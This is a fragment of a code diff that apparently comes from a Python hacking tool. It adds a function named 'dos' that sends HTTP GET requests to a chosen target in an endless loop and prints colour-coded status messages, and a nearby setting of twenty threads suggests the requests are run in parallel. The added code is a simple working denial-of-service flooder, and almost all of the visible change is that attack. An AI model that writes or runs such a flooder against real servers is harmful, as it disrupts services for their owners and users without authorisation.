@@ -125,7 +125,15 @@ def main():
                 return True
             except OSError:
                 return False
- 
+                  
+        def dos(target):
+            while True:
+                try:
+                    res = requests.get(target)
+                    print("Request sent")
+                except requests.exceptions.ConnectionError:
+                    print(R + R + "[" + B + "!" + R + "] " + R + "Connection error")
+                      
         threads = 20
 
         
